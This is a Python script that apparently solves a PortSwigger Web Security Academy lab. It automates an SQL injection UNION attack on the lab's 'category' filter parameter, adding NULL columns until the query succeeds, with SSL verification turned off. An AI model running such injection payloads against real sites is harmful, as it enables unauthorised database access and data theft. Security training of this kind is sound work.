#!/usr/bin/env python3
from dataclasses import dataclass, field
from typing import Dict
import requests

# Disable warnings generated due to unverified SSL connections
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

"""
Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
"""

@dataclass()
class Request:
    url: str = field()
    parameters: Dict = field(default_factory=dict)
    session: requests.sessions.Session = field(default=requests.Session())
    response: requests.models.Response = field(default=None)

    def get(self) -> response:
        """
        Perform an HTTP GET request
        :return: response
        """
        self.response = self.validate(self.session.get, url=self.url, params=self.parameters, verify=False, timeout=10)
        return self.response

    def post(self) -> response:
        """
        Perform an HTTP POST request
        :return: response
        """
        self.response = self.validate(self.session.post, url=self.url, params=self.parameters, verify=False, timeout=10)
        return self.response

    @staticmethod
    def validate(response, **kwargs) -> response:
        """
        :param response: Session object for GET or POST
        :param kwargs: Keyword Arguments used to instantiate the request
        :return: response
        """
        try:
            response = response(**kwargs)
            response.raise_for_status()
        except requests.exceptions.HTTPError:
            if response.status_code == 404:
                help_msg = 'The session you are looking for has expired.'
                exit(f'{response.status_code}: {response.reason}. {help_msg}')
        except requests.exceptions.ConnectionError as error:
            help_msg = 'Please make sure you are using a valid URL.'
            exit(f'{help_msg}\n{error}')
        except requests.exceptions.RequestException as error:
            help_msg = 'Caught general exception:'
            exit(f'{help_msg} {error}')

        return response

@dataclass()
class Injection(Request):
    null: list = field(default_factory=list)

    def __post_init__(self):
        self.null = ["'UNION SELECT", 'NULL', '--']
        self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"

    def logic(self):
        while not self.response.ok:
            # Remove '--' then add ', NULL --' until response.ok is True
            self.null.remove('--')
            self.null.extend([',', 'NULL', '--'])
            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
            self.get()

if __name__ == '__main__':
    url = 'https://ac691fa61eeff0fe807ecc9c006500e6.web-security-academy.net/'
    url = f'{url}filter'

    sqli = Injection(url)
    sqli.get()
    sqli.logic()

    print(f"There are {sqli.null.count('NULL')} columns.")
